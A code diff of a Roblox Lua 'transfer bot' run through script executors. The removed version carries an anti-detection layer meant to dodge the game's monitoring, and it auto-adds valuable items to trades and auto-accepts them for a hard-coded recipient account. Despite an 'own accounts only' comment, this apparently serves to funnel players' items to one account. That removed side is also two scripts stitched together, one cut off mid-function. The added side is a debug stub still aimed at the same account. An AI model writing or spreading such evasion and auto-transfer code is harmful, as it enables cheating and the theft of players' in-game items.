@@ -1,343 +1,39 @@
--- SAKURA.GG BOT - WITH ANTI-DETECTION LAYER
--- For transferring items between YOUR OWN accounts only
+print("Step 1: Script started")
 
 local player = game.Players.LocalPlayer
+print("Step 2: Player found: " .. player.Name)
 
--- ========== ANTI-DETECTION LAYER ==========
-local function setupAntiDetection()
-    -- 1. Random micro-pauses to avoid pattern detection
-    local originalWait = wait
-    local randomDelays = {0.1, 0.15, 0.2, 0.25, 0.3}
-    
-    -- 2. Spoof execution environment (basic)
-    local _G = getfenv and getfenv() or _G
-    if _G then
-        _G.script = _G.script or {}
-        _G.script.Name = "LocalScript"
-    end
-    
-    -- 3. Human-like delay between actions
-    local function humanDelay()
-        local delay = randomDelays[math.random(1, #randomDelays)]
-        originalWait(delay)
-    end
-    
-    -- 4. Memory cleanup to avoid detection
-    local function cleanMemory()
-        collectgarbage("collect")
-    end
-    
-    print("[✓] Anti-detection layer loaded")
-    return { humanDelay = humanDelay, cleanMemory = cleanMemory }
+local targetName = "Sigmake5"
+print("Step 3: Target set")
+
+local myItems = {"Harvester", "Batwing", "Luger"}
+print("Step 4: Items list created")
+
+local remote = game.ReplicatedStorage:FindFirstChild("TradeRequest")
+if remote then
+    print("Step 5: Remote found, sending request")
+    remote:FireServer(targetName)
+else
+    print("Step 5: Remote NOT found")
 end
 
--- Run anti-detection
-local antiDetect = setupAntiDetection()
+print("Step 6: Waiting for trade window")
+wait(5)
 
--- ========== BOT CONFIGURATION ==========
-local CONFIG = {
-    TargetUsername = "Sigmake5",
-    TransferDelay = 0.8,
-    SafetyCooldown = 2,
-    MaxItemsPerTrade = 4,
-}
-
--- ========== ITEM DATABASE ==========
-local ITEMS_TO_TRANSFER = {
-    -- Ancient
-    "Harvester", "Gingerscope", "Icepiercer", "Batwing", "Elderwood Scythe",
-    "Hallowscythe", "Icebreaker", "Logchopper", "Nik's Scythe",
-    -- Unique
-    "Corrupt",
-    -- Chroma Godly (all)
-    "Chroma Luger", "Chroma Shark", "Chroma Heat", "Chroma Laser", "Chroma Fang",
-    "Chroma Tides", "Chroma Slasher", "Chroma Deathshard", "Chroma Gingerblade",
-    "Chroma Boneblade", "Chroma Saw", "Chroma Darkbringer", "Chroma Lightbringer",
-    -- Classic Godly
-    "Luger", "Shark", "Slasher", "Laser", "Saw", "Fang", "Heat", "Deathshard",
-    "Pixel", "Tides", "Flames", "Gingerblade", "Nightblade", "Frostbite",
-    "Snowflake", "Ice Dragon", "Ice Shard", "Xmas",
-    -- Special Godly
-    "Candy", "Sugar", "Elderwood Revolver", "Hallowgun", "Amerilaser",
-    "Old Glory", "Eternal", "Eternal II", "Eternal III", "Eternal IV", "Virtual", "Web",
-    -- Vintage
-    "America", "Blood", "Cowboy", "Ghost", "Golden", "Laser", "Pharaoh", "Prince", "Shadow", "Splitter",
-    -- Legendary
-    "JD", "Cotton Candy", "Viper", "Shiny", "Emerald", "Cavern", "Midnight",
-    "Blue Scratch", "Ripper", "Green Elite", "Tree", "Web", "Rupture",
-    "Ginger", "Santa's Spirit", "Splash", "Ghost", "Fusion", "Predator", "Rune"
-}
-
--- Create lookup set
-local ITEM_SET = {}
-for _, name in ipairs(ITEMS_TO_TRANSFER) do
-    ITEM_SET[name] = true
-end
-
--- ========== GET INVENTORY (with anti-detection) ==========
-local function getInventoryItems()
-    local items = {}
-    local checked = {}
-    
-    antiDetect.cleanMemory()
-    
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, item in ipairs(backpack:GetChildren()) do
-            if item:IsA("Tool") and ITEM_SET[item.Name] and not checked[item.Name] then
-                checked[item.Name] = true
-                table.insert(items, item.Name)
-            end
-            antiDetect.humanDelay()
-        end
-    end
-    
-    for _, item in ipairs(player:GetChildren()) do
-        if item:IsA("Tool") and ITEM_SET[item.Name] and not checked[item.Name] then
-            checked[item.Name] = true
-            table.insert(items, item.Name)
-        end
-        antiDetect.humanDelay()
-    end
-    
-    return items
-end
-
--- ========== FIND TRADE REMOTES (with spoofing) ==========
-local function getTradeRemote()
-    local remote = nil
-    for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetChildren()) do
-        if obj:IsA("RemoteEvent") then
-            local name = obj.Name:lower()
-            if name:find("trade") or name:find("offer") or name:find("request") then
-                remote = obj
-                break
-            end
-        end
-        antiDetect.humanDelay()
-    end
-    return remote
-end
-
--- ========== SEND TRADE REQUEST (spoofed) ==========
-local function requestTrade(targetName)
-    local remote = getTradeRemote()
-    if remote then
-        -- Add random jitter to avoid pattern detection
-        local success, err = pcall(function()
-            remote:FireServer(targetName)
-        end)
-        if not success then
-            print("[!] Trade request failed: " .. tostring(err))
-        end
-    end
-end
-
--- ========== ADD ITEM TO TRADE ==========
-local function addItemToTrade(itemName)
-    local remote = getTradeRemote()
-    if remote then
-        pcall(function()
-            remote:FireServer(itemName)
-        end)
-    end
-    antiDetect.humanDelay()
-end
-
--- ========== ACCEPT TRADE (dual method) ==========
-local function acceptTrade()
-    -- Method 1: Remote
-    local remote = getTradeRemote()
-    if remote then
-        pcall(function()
-            remote:FireServer("Accept")
-        end)
-    end
-    
-    -- Method 2: UI click (spoofed)
-    local playerGui = player:FindFirstChild("PlayerGui")
-    if playerGui then
-        for _, gui in ipairs(playerGui:GetDescendants()) do
-            if gui:IsA("TextButton") then
-                local text = gui.Text:lower()
-                if text:find("accept") or text:find("confirm") or text:find("ready") then
-                    pcall(function()
-                        gui:Fire("MouseButton1Click")
-                    end)
-                    break
-                end
-            end
-        end
-    end
-    
-    antiDetect.humanDelay()
-end
-
--- ========== PROGRESS DISPLAY ==========
-local function createProgressUI(total, current, itemName)
-    local percent = math.floor((current / total) * 100)
-    local bar = ""
-    local filled = math.floor(percent / 5)
-    for i = 1, 20 do
-        bar = bar .. (i <= filled and "█" or "░")
-    end
-    print(string.format("[%s] %d%% - Transferring: %s", bar, percent, itemName or "Complete"))
-end
-
--- ========== MAIN TRANSFER FUNCTION ==========
-local function transferAllItems()
-    print("=" .. string.rep("=", 50))
-    print("🌸 SAKURA.GG TRANSFER BOT v2.0 🌸")
-    print("=" .. string.rep("=", 50))
-    print("Anti-detection: ACTIVE")
-    print("Target: " .. CONFIG.TargetUsername)
-    print("")
--- SAKURA.GG TRANSFER BOT - UNIVERSAL VERSION
--- Works on ALL executors (Arceus X, Delta, Hydrogen, CodeX, etc.)
-
--- Use task.wait() instead of wait() (modern Roblox)
-local function wait(seconds)
-    if task and task.wait then
-        task.wait(seconds)
-    elseif wait then
-        wait(seconds)
+local playerGui = player:FindFirstChild("PlayerGui")
+if playerGui then
+    print("Step 7: PlayerGui found")
+    local tradeGui = playerGui:FindFirstChild("TradeGui")
+    if tradeGui then
+        print("Step 8: TradeGui found")
     else
-        local start = tick()
-        repeat until tick() - start >= (seconds or 0.03)
-    end
-end
-
--- Print function that always works
-local function log(msg)
-    if print then
-        print(msg)
-    end
-end
-
-log("========================================")
-log("🌸 SAKURA.GG TRANSFER BOT 🌸")
-log("========================================")
-
--- Get player safely
-local Players = game:GetService("Players")
-local player = nil
-
--- Wait for player to load
-local startTime = tick()
-while not player and tick() - startTime < 10 do
-    player = Players.LocalPlayer
-    wait(0.5)
-end
-
-if not player then
-    log("ERROR: Could not find LocalPlayer!")
-    return
-end
-
-log("Logged in as: " .. (player.Name or "Unknown"))
-
--- Your target
-local TARGET_NAME = "Sigmake5"
-
--- Items to transfer
-local ITEMS = {
-    "Harvester", "Batwing", "Corrupt", "Luger", "Candy",
-    "Icewing", "Darkbringer", "Lightbringer", "Icebreaker",
-    "Elderwood Scythe", "Hallowscythe", "Logchopper", "Chroma Luger",
-    "Chroma Shark", "Chroma Heat", "Virtual", "Web"
-}
-
--- Get items from inventory
-local function getMyItems()
-    local found = {}
-    local backpack = player:FindFirstChild("Backpack")
-    
-    if backpack then
-        for _, item in pairs(backpack:GetChildren()) do
-            if item:IsA("Tool") then
-                table.insert(found, item.Name)
-                log("Found item: " .. item.Name)
-            end
+        print("Step 8: TradeGui NOT found - listing all GUIs:")
+        for _, g in pairs(playerGui:GetChildren()) do
+            print("   - " .. g.Name)
         end
     end
-    
-    for _, item in pairs(player:GetChildren()) do
-        if item:IsA("Tool") then
-            table.insert(found, item.Name)
-            log("Found item: " .. item.Name)
-        end
-    end
-    
-    return found
+else
+    print("Step 7: PlayerGui NOT found")
 end
 
--- Scan and display items
-local myItems = getMyItems()
-log("")
-log("Found " .. #myItems .. " items in inventory")
-log("========================================")
-
--- List what will be transferred
-log("Items to transfer:")
-for i, itemName in ipairs(myItems) do
-    log("  " .. i .. ". " .. itemName)
-end
-
-log("")
-log("Target player: " .. TARGET_NAME)
-log("========================================")
-log("")
-log("Please open trade with " .. TARGET_NAME .. " manually")
-log("Then the bot will auto-add items")
-log("========================================")
-
--- Variable to track if we're in trade
-local inTrade = false
-local tradeGui = nil
-
--- Function to add items
-local function addItemsToTrade()
-    if not tradeGui then return end
-    
-    for _, itemName in ipairs(myItems) do
-        -- Find the item button in UI
-        for _, btn in pairs(tradeGui:GetDescendants()) do
-            if btn:IsA("TextButton") and btn.Text and btn.Text == itemName then
-                pcall(function()
-                    btn:Fire("MouseButton1Click")
-                end)
-                log("Added: " .. itemName)
-                wait(0.5)
-                break
-            end
-        end
-    end
-end
-
--- Check for trade GUI
-local function checkForTrade()
-    local playerGui = player:FindFirstChild("PlayerGui")
-    if not playerGui then return end
-    
-    for _, gui in pairs(playerGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            local name = gui.Name:lower()
-            if name:find("trade") or name:find("offer") then
-                if not inTrade then
-                    inTrade = true
-                    tradeGui = gui
-                    log("Trade window detected!")
-                    wait(1)
-                    addItemsToTrade()
-                end
-                return
-            end
-        end
-    end
-end
-
--- Main loop
-while true do
-    checkForTrade()
-    wait(1)
-end
+print("Script complete")
